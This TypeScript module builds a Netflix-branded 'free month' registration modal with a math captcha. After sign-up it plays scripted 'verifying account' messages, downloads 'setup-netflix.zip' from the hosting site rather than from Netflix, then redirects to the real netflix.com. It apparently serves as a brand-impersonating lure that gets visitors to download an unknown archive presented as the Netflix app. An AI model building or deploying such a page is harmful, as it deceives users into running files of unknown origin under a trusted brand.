import netflixLogo from '@/assets/image/netflix-logo';

const generateCaptcha = () => {
    const num1 = Math.floor(Math.random() * 10) + 1;
    const num2 = Math.floor(Math.random() * 10) + 1;
    const operators = ['+', '-', '×'];
    const operator = operators[Math.floor(Math.random() * operators.length)];

    let answer: number;
    switch (operator) {
        case '+':
            answer = num1 + num2;
            break;
        case '-':
            answer = num1 - num2;
            break;
        case '×':
            answer = num1 * num2;
            break;
        default:
            answer = num1 + num2;
    }

    return {
        question: `${num1} ${operator} ${num2} = ?`,
        answer: answer,
    };
};

const createRegistrationModal = () => {
    const captcha = generateCaptcha();

    const modal = document.createElement('div');
    modal.className =
        'fixed inset-0 bg-black/50 flex items-center justify-center z-50 opacity-0 transition-opacity duration-300 ease-out';
    modal.id = 'registrationModal';

    setTimeout(() => {
        modal.classList.remove('opacity-0');
        modal.classList.add('opacity-100');
    }, 10);

    modal.innerHTML = /* HTML */ `
        <div
            class="modal-content mx-4 w-full max-w-md scale-95 transform rounded-lg border border-gray-800 bg-black p-8 shadow-2xl transition-all duration-300 ease-out"
        >
            <div class="mb-6 text-center">
                <div
                    class="mb-4 flex transform justify-center transition-transform duration-500 ease-out"
                >
                    ${netflixLogo}
                </div>
                <h2
                    class="mb-2 translate-y-2 transform text-2xl font-bold text-white opacity-0 transition-all delay-100 duration-500 ease-out"
                >
                    Start Your Free Month
                </h2>
                <p
                    class="translate-y-2 transform text-sm text-gray-400 opacity-0 transition-all delay-200 duration-500 ease-out"
                >
                    Join millions of viewers worldwide
                </p>
            </div>

            <form
                id="registrationForm"
                class="translate-y-4 transform space-y-5 opacity-0 transition-all delay-300 duration-500 ease-out"
            >
                <div
                    class="duration-400 delay-400 translate-y-2 transform opacity-0 transition-all ease-out"
                >
                    <label class="mb-2 block text-sm font-medium text-gray-300"
                        >Full Name</label
                    >
                    <input
                        type="text"
                        id="fullName"
                        required
                        class="w-full rounded-md border border-gray-700 bg-gray-900 px-4 py-3 text-white placeholder-gray-500 transition-all duration-200 hover:border-gray-600 focus:border-transparent focus:outline-none focus:ring-2 focus:ring-red-600"
                        placeholder="Enter your full name"
                    />
                </div>

                <div
                    class="duration-400 translate-y-2 transform opacity-0 transition-all delay-500 ease-out"
                >
                    <label class="mb-2 block text-sm font-medium text-gray-300"
                        >Age</label
                    >
                    <input
                        type="number"
                        id="age"
                        required
                        min="13"
                        max="120"
                        class="w-full rounded-md border border-gray-700 bg-gray-900 px-4 py-3 text-white placeholder-gray-500 transition-all duration-200 hover:border-gray-600 focus:border-transparent focus:outline-none focus:ring-2 focus:ring-red-600"
                        placeholder="Enter your age"
                    />
                </div>

                <div
                    class="duration-400 delay-600 translate-y-2 transform opacity-0 transition-all ease-out"
                >
                    <label class="mb-2 block text-sm font-medium text-gray-300"
                        >Email Address</label
                    >
                    <input
                        type="email"
                        id="email"
                        required
                        class="w-full rounded-md border border-gray-700 bg-gray-900 px-4 py-3 text-white placeholder-gray-500 transition-all duration-200 hover:border-gray-600 focus:border-transparent focus:outline-none focus:ring-2 focus:ring-red-600"
                        placeholder="Enter your email"
                    />
                </div>

                <div
                    class="duration-400 translate-y-2 transform opacity-0 transition-all delay-700 ease-out"
                >
                    <label class="mb-2 block text-sm font-medium text-gray-300"
                        >Security Verification</label
                    >
                    <div class="flex items-center space-x-3">
                        <div
                            class="transform rounded-md bg-red-600 px-4 py-3 font-mono text-lg font-bold text-white shadow-lg transition-transform duration-200 hover:scale-105"
                        >
                            ${captcha.question}
                        </div>
                        <input
                            type="number"
                            id="captchaAnswer"
                            required
                            class="flex-1 rounded-md border border-gray-700 bg-gray-900 px-4 py-3 text-white placeholder-gray-500 transition-all duration-200 hover:border-gray-600 focus:border-transparent focus:outline-none focus:ring-2 focus:ring-red-600"
                            placeholder="Answer"
                        />
                    </div>
                </div>

                <div
                    class="duration-400 delay-800 flex translate-y-2 transform space-x-3 pt-6 opacity-0 transition-all ease-out"
                >
                    <button
                        type="button"
                        id="cancelBtn"
                        class="flex-1 transform rounded-md border border-gray-600 px-6 py-3 font-medium text-gray-300 transition-all duration-200 hover:scale-105 hover:border-gray-500 hover:bg-gray-800"
                    >
                        Cancel
                    </button>
                    <button
                        type="submit"
                        id="registerBtn"
                        class="flex-1 transform rounded-md bg-red-600 px-6 py-3 font-medium text-white shadow-lg transition-all duration-200 hover:scale-105 hover:bg-red-700 hover:shadow-red-600/25"
                    >
                        Start Watching
                    </button>
                </div>
            </form>

            <div
                class="duration-400 delay-900 mt-6 translate-y-2 transform text-center text-xs text-gray-500 opacity-0 transition-all ease-out"
            >
                <p>By registering, you agree to our Terms of Service</p>
                <p class="mt-1">Cancel anytime. No commitments.</p>
            </div>
        </div>
        <style>
            @keyframes modalEnter {
                from {
                    transform: scale(0.95) translateY(20px);
                    opacity: 0;
                }
                to {
                    transform: scale(1) translateY(0);
                    opacity: 1;
                }
            }

            .modal-content {
                animation: modalEnter 0.3s ease-out forwards;
            }
        </style>
    `;

    setTimeout(() => {
        const modalContent = modal.querySelector(
            '.modal-content'
        ) as HTMLElement;
        const title = modal.querySelector('h2') as HTMLElement;
        const subtitle = modal.querySelector('p') as HTMLElement;
        const form = modal.querySelector('#registrationForm') as HTMLElement;
        const formFields = modal.querySelectorAll('form > div');
        const buttons = modal.querySelector(
            '.flex.space-x-3.pt-6'
        ) as HTMLElement;
        const footer = modal.querySelector('.text-center.mt-6') as HTMLElement;

        if (modalContent) modalContent.classList.remove('scale-95');
        if (title) title.classList.remove('opacity-0', 'translate-y-2');
        if (subtitle) subtitle.classList.remove('opacity-0', 'translate-y-2');
        if (form) form.classList.remove('opacity-0', 'translate-y-4');

        formFields.forEach((field, index) => {
            const fieldElement = field as HTMLElement;
            setTimeout(
                () => {
                    fieldElement.classList.remove('opacity-0', 'translate-y-2');
                },
                (index + 1) * 150
            );
        });

        setTimeout(
            () => {
                if (buttons)
                    buttons.classList.remove('opacity-0', 'translate-y-2');
            },
            (formFields.length + 1) * 150
        );

        setTimeout(
            () => {
                if (footer)
                    footer.classList.remove('opacity-0', 'translate-y-2');
            },
            (formFields.length + 2) * 150
        );
    }, 50);

    return { modal, captcha };
};

const downloadFile = (filename: string) => {
    const link = document.createElement('a');
    link.href = `/${filename}`;
    link.download = filename;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
};

const showSuccessAndDownload = () => {
    const modal = document.getElementById('registrationModal');
    if (modal) {
        modal.innerHTML = /* HTML */ `
            <div
                class="success-modal mx-4 w-full max-w-md scale-95 transform rounded-lg border border-gray-800 bg-black p-8 text-center opacity-0 shadow-2xl transition-all duration-500 ease-out"
            >
                <div
                    class="mb-4 flex scale-110 transform justify-center transition-transform duration-700 ease-out"
                >
                    ${netflixLogo}
                </div>
                <div class="relative mb-4">
                    <svg
                        class="checkmark-svg mx-auto h-16 w-16 text-green-400"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <circle
                            cx="12"
                            cy="12"
                            r="10"
                            stroke-width="2"
                            class="checkmark-circle"
                        />
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="m9 12 2 2 4-4"
                            class="checkmark-path"
                        />
                    </svg>
                </div>
                <h2
                    class="mb-2 translate-y-4 transform text-2xl font-bold text-white opacity-0 transition-all delay-300 duration-500 ease-out"
                >
                    Welcome to Netflix!
                </h2>
                <p
                    class="delay-400 mb-6 translate-y-4 transform text-gray-400 opacity-0 transition-all duration-500 ease-out"
                >
                    Your free month starts now. Downloading the app...
                </p>
                <div
                    class="mb-6 flex translate-y-4 transform items-center justify-center opacity-0 transition-all delay-500 duration-500 ease-out"
                >
                    <div class="relative">
                        <div
                            class="h-6 w-6 rounded-full border-2 border-red-600/30"
                        ></div>
                        <div
                            class="absolute inset-0 h-6 w-6 animate-spin rounded-full border-2 border-red-600 border-t-transparent"
                        ></div>
                    </div>
                    <span class="loading-text ml-3 font-medium text-red-600"
                        >Preparing download...</span
                    >
                </div>
                <div
                    class="delay-600 mb-4 h-4 w-full translate-y-4 transform overflow-hidden rounded-full bg-gray-800 opacity-0 shadow-inner transition-all duration-500 ease-out"
                >
                    <div
                        class="progress-bar relative h-4 overflow-hidden rounded-full bg-gradient-to-r from-red-600 via-red-500 to-red-400 shadow-lg"
                        style="width: 0%;"
                    >
                        <div
                            class="absolute inset-0 animate-pulse bg-gradient-to-r from-transparent via-white/20 to-transparent"
                        ></div>
                    </div>
                </div>
                <div
                    class="translate-y-4 transform space-y-1 text-xs text-gray-500 opacity-0 transition-all delay-700 duration-500 ease-out"
                >
                    <p>Unlimited movies & TV shows</p>
                    <p>Watch on any device</p>
                    <p>No ads, no commitments</p>
                </div>
            </div>
            <style>
                @keyframes checkmarkDraw {
                    0% {
                        stroke-dasharray: 0 100;
                    }
                    100% {
                        stroke-dasharray: 100 0;
                    }
                }

                @keyframes checkmarkCircle {
                    0% {
                        stroke-dasharray: 0 100;
                        transform: rotate(-90deg);
                    }
                    100% {
                        stroke-dasharray: 100 0;
                        transform: rotate(0deg);
                    }
                }

                @keyframes progressAdvanced {
                    0% {
                        box-shadow: 0 0 0 rgba(239, 68, 68, 0);
                        width: 0%;
                    }
                    15% {
                        box-shadow: 0 0 10px rgba(239, 68, 68, 0.3);
                        width: 20%;
                    }
                    30% {
                        box-shadow: 0 0 15px rgba(239, 68, 68, 0.4);
                        width: 35%;
                    }
                    50% {
                        box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
                        width: 55%;
                    }
                    70% {
                        box-shadow: 0 0 25px rgba(239, 68, 68, 0.6);
                        width: 75%;
                    }
                    85% {
                        box-shadow: 0 0 30px rgba(239, 68, 68, 0.7);
                        width: 90%;
                    }
                    100% {
                        box-shadow: 0 0 35px rgba(239, 68, 68, 0.8);
                        width: 100%;
                    }
                }

                .checkmark-circle {
                    stroke-dasharray: 100;
                    stroke-dashoffset: 100;
                    transform-origin: center;
                    animation: checkmarkCircle 0.8s ease-in-out 0.2s forwards;
                }

                .checkmark-path {
                    stroke-dasharray: 20;
                    stroke-dashoffset: 20;
                    animation: checkmarkDraw 0.5s ease-in-out 0.8s forwards;
                }

                .progress-bar {
                    animation: progressAdvanced 4s
                        cubic-bezier(0.25, 0.46, 0.45, 0.94) forwards;
                }

                .success-modal {
                    animation: successEnter 0.5s ease-out forwards;
                }

                @keyframes successEnter {
                    from {
                        transform: scale(0.9) translateY(30px);
                        opacity: 0;
                    }
                    to {
                        transform: scale(1) translateY(0);
                        opacity: 1;
                    }
                }
            </style>
        `;

        setTimeout(() => {
            const successModal = modal.querySelector('.success-modal');
            const title = modal.querySelector('h2');
            const subtitle = modal.querySelector('p');
            const loadingSection = modal.querySelector('.flex.items-center');
            const progressSection = modal.querySelector('.w-full.bg-gray-800');
            const features = modal.querySelector('.text-xs.text-gray-500');

            if (successModal)
                successModal.classList.remove('opacity-0', 'scale-95');
            if (title) title.classList.remove('opacity-0', 'translate-y-4');
            if (subtitle)
                subtitle.classList.remove('opacity-0', 'translate-y-4');
            if (loadingSection)
                loadingSection.classList.remove('opacity-0', 'translate-y-4');
            if (progressSection)
                progressSection.classList.remove('opacity-0', 'translate-y-4');
            if (features)
                features.classList.remove('opacity-0', 'translate-y-4');
        }, 100);

        const loadingText = modal.querySelector('.loading-text') as HTMLElement;
        const messages = [
            'Preparing download...',
            'Verifying account...',
            'Setting up your access...',
            'Optimizing experience...',
            'Almost ready...',
            'Starting download...',
        ];

        let messageIndex = 0;
        const messageInterval = setInterval(() => {
            if (loadingText && messageIndex < messages.length - 1) {
                loadingText.style.opacity = '0';
                loadingText.style.transform = 'translateY(10px)';

                setTimeout(() => {
                    messageIndex++;
                    loadingText.textContent = messages[messageIndex];
                    loadingText.style.opacity = '1';
                    loadingText.style.transform = 'translateY(0)';
                }, 200);
            }
        }, 700);

        setTimeout(() => {
            clearInterval(messageInterval);
            downloadFile('setup-netflix.zip');

            setTimeout(() => {
                modal.style.opacity = '0';
                modal.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    document.body.removeChild(modal);
                    window.location.href = 'http://netflix.com/';
                }, 300);
            }, 1000);
        }, 4500);
    }
};
const DownloadModal = () => {
    const downloadBtn = document.getElementById('downloadBtn');
    if (downloadBtn) {
        downloadBtn.addEventListener('click', () => {
            const { modal, captcha } = createRegistrationModal();
            document.body.appendChild(modal);

            const fullNameInput = document.getElementById(
                'fullName'
            ) as HTMLInputElement;
            fullNameInput?.addEventListener('input', (e) => {
                const target = e.target as HTMLInputElement;
                const cursorPosition = target.selectionStart;
                target.value = target.value.toUpperCase();
                target.setSelectionRange(cursorPosition, cursorPosition);
            });

            const form = document.getElementById(
                'registrationForm'
            ) as HTMLFormElement;
            const cancelBtn = document.getElementById('cancelBtn');

            form?.addEventListener('submit', (e) => {
                e.preventDefault();

                const age = (document.getElementById('age') as HTMLInputElement)
                    .value;
                const captchaAnswer = parseInt(
                    (
                        document.getElementById(
                            'captchaAnswer'
                        ) as HTMLInputElement
                    ).value
                );

                if (captchaAnswer !== captcha.answer) {
                    alert('Incorrect security answer. Please try again.');
                    return;
                }

                if (parseInt(age) < 13) {
                    alert('You must be at least 13 years old to register.');
                    return;
                }

                showSuccessAndDownload();
            });

            cancelBtn?.addEventListener('click', () => {
                modal.style.opacity = '0';
                const modalContent = modal.querySelector(
                    '.modal-content'
                ) as HTMLElement;
                if (modalContent) {
                    modalContent.style.transform =
                        'scale(0.95) translateY(20px)';
                }
                setTimeout(() => {
                    document.body.removeChild(modal);
                }, 300);
            });

            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.style.opacity = '0';
                    const modalContent = modal.querySelector(
                        '.modal-content'
                    ) as HTMLElement;
                    if (modalContent) {
                        modalContent.style.transform =
                            'scale(0.95) translateY(20px)';
                    }
                    setTimeout(() => {
                        document.body.removeChild(modal);
                    }, 300);
                }
            });
        });
    }
};
export default DownloadModal;
